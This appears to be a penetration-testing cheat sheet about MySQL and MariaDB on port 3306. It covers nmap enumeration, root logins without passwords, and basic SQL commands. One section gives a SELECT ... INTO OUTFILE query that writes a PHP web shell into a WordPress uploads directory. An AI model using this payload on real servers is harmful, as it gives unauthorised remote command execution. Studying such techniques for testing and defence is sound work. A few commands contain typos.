---
title: "3306 mariadb mysql"
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - mariadb
  - port 3306
  - mysql
---

# 3306 mariaDB - mySQL

## Description

**MySQL**: MySQL is an open-source relational database management system(RDBMS) based on Structured Query Language (SQL). It is developed and managed by oracle corporation and initially released on 23 may, 1995. It is widely being used in many small and large scale industrial applications and capable of handling a large volume of data. After the acquisition of MySQL by Oracle, some issues happened with the usage of the database and hence MariaDB was developed.

**MariaDB**: MariaDB is an open source relational database management system (RDBMS) that is a compatible drop-in replacement for the widely used MySQL database technology. It is developed by MariaDB Foundation and initially released on 29 October 2009. MariaDB has a significantly high number of new features, which makes it better in terms of performance and user-orientation than MySQL.


```shell-session
sudo nmap $ip -sV -sC -p3306 --script mysql*
```




## Connect to database: mariadb

```bash
# -h host/ip   
# -u user As default mariadb has a root user with no authentication
mariadb -h <host/IP> -u root
```


## Connect to database: mysql 

```bash
# -h host/ip   
# -u user As default mysql has a root user with no authentication
mysql --host=INSTANCE_IP --user=root --password=thepassword
mysql -h <host/IP> -u root -p<password>

mysql -u root -h <host/IP>

```

## mariadb commands

```bash
# Get all databases
show databases;

# Select a database
use <databaseName>;

# Get all tables from the previously selected database
show tables; 

# Dump columns from a table
describe <table_name>;

# Dump columns from a table
show columns from <table>;

# Select column from table
select usename,password from users;
```

## Upload a shell 

Take a wordpress installation that uses a mysql database. If you manage to login into the mysql panel (/phpmyadmin) as root then you could upload a php shell to the /wp-content/uploads/ folder.

```mysql
Select "<?php echo shell_exec($_GET['cmd']);?>" into outfile "/var/www/https/blogblog/wp-content/uploads/shell.php";
```

## mysql basic commands

See [mysql](mysql.md).


```mysql
# Show datases
SHOW databases;

# Show tables
SHOW tables;

# Create new database
CREATE DATABASE nameofdatabase;

# Delete database
DROP DATABASE nameofdatabase;

# Select a database
USE nameofdatabase;

# Show tablesç
SHOW tables;

# Dump content from nameOftable
SELECT * FROM NameOfTable

# Create a table with some columns in the previously selected database
CREATE TABLE person(nombre VARCHAR(255), edad INT, id INT);

# Modify, add, or remove a column attribute of a table
ALTER TABLE persona MODIFY edad VARCHAR(200);
ALTER TABLE persona ADD description VARCHAR(200);
ALTER TABLE persona DROP edad VARCHAR(200);

# Insert a new row with values in a table
INSERT INTO persona VALUES("alvaro", 54, 1);

# Show all rows from table
SELECT * FROM persona

# Select a row from a table filtering by the value of a given column
SELECT * FROM persona WHERE nombre="alvaro";

# JOIN query
SELECT * FROM oficina JOIN persona ON persona.id=oficina.user_id;

# UNION query. This means, for an attack, that the number of columns has to be the same
SELECT * FROM oficina UNION SELECT * from persona;
```


### Enumeration queries 

```mysql
# Show current user
current_user()
user()

# Show current database
database()
```
